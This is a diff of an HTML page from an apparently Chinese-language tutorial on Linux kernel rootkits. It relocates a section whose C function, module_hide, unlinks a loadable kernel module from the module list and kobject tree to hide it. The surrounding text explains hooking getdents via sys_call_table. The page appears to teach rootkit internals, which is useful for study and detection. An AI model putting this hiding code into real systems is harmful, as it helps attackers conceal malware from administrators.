@@ -231,9 +231,42 @@ Hello,<span class="w"> </span>World!
 <h4>内核态可装载内核模块（LKM）</h4>
 <p>内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。</p>
 <h5>修改哪些数据结构</h5>
-<h5>怎么HOOK与HOOK哪些函数</h5>
-<p>当某个程序需要借助网络、文件系统或其他系统特定活动进行工作时，它就必须经过内核。也就是说，在此时它将使用系统调用。我们可以使用一个名为Strace的工具。Strace将会列出程序所使用的系统调用。</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># yum -y install strace</span>
+<p>隐藏模块。具体功能如下：</p>
+<ul>
+<li>记录当前模块的链表前驱节点。</li>
+<li>从模块链表中删除当前模块。</li>
+<li>记录当前模块的kobject链表前驱节点。</li>
+<li>删除模块的kobject。</li>
+<li>从kobject链表中删除当前模块。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>static<span class="w"> </span>struct<span class="w"> </span>list_head<span class="w"> </span>*module_previous<span class="p">;</span>
+static<span class="w"> </span>struct<span class="w"> </span>list_head<span class="w"> </span>*module_kobj_previous<span class="p">;</span>
+static<span class="w"> </span>char<span class="w"> </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
+
+
+void<span class="w"> </span>module_hide<span class="o">(</span>void<span class="o">)</span>
+<span class="o">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>module_hidden<span class="o">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">module_previous</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>THIS_MODULE-&gt;list.prev<span class="p">;</span>
+<span class="w">    </span>list_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;list<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">module_kobj_previous</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>THIS_MODULE-&gt;mkobj.kobj.entry.prev<span class="p">;</span>
+<span class="w">    </span>kobject_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;mkobj.kobj<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>list_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;mkobj.kobj.entry<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>!module_hidden<span class="p">;</span>
+<span class="o">}</span>
+
+
+<span class="w"> </span><span class="sb">```</span>
+
+
+
+
+<span class="c1">##### 怎么HOOK与HOOK哪些函数</span>
+
+当某个程序需要借助网络、文件系统或其他系统特定活动进行工作时，它就必须经过内核。也就是说，在此时它将使用系统调用。我们可以使用一个名为Strace的工具。Strace将会列出程序所使用的系统调用。
+
+<span class="sb">```</span>bash
+<span class="c1"># yum -y install strace</span>
 <span class="c1">#cd /bin &amp;&amp; strace ls </span>
 
 ioctl<span class="o">(</span><span class="m">1</span>,<span class="w"> </span>TIOCGWINSZ,<span class="w"> </span>0x7ffedb86fcd0<span class="o">)</span><span class="w">    </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOTTY<span class="w"> </span><span class="o">(</span>Inappropriate<span class="w"> </span>ioctl<span class="w"> </span><span class="k">for</span><span class="w"> </span>device<span class="o">)</span>
@@ -253,29 +286,6 @@ getdents<span class="o">(</span><span class="m">3</span>,<span class="w"> </span
 <p>在Linux系统中，如果我们想在内核中运行代码，我们可以借助于可装载内核模块（LKM）。一些有用的内核符号就会被内核导出，我们便能够去使用它们，或者也可以通过kallsyms_lookup_name函数来获取。在内核中，我们需要拦截getdents调用，并对它返回的值进行更改。那么，接下来要解决的问题就是我们要如何Hook getdents。</p>
 <p>在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
 系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。</p>
-<p>隐藏模块。具体功能如下：</p>
-<ul>
-<li>记录当前模块的链表前驱节点。</li>
-<li>从模块链表中删除当前模块。</li>
-<li>记录当前模块的kobject链表前驱节点。</li>
-<li>删除模块的kobject。</li>
-<li>从kobject链表中删除当前模块。</li>
-</ul>
-<p>```bash</p>
-<p>static struct list_head <em>module_previous;
-static struct list_head </em>module_kobj_previous;
-static char module_hidden = 0;</p>
-<p>void module_hide(void)
-{
-    if (module_hidden) return;
-    module_previous = THIS_MODULE-&gt;list.prev;
-    list_del(&amp;THIS_MODULE-&gt;list);
-    module_kobj_previous = THIS_MODULE-&gt;mkobj.kobj.entry.prev;
-    kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);
-    list_del(&amp;THIS_MODULE-&gt;mkobj.kobj.entry);
-    module_hidden = !module_hidden;
-}</p>
-<p>```</p>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
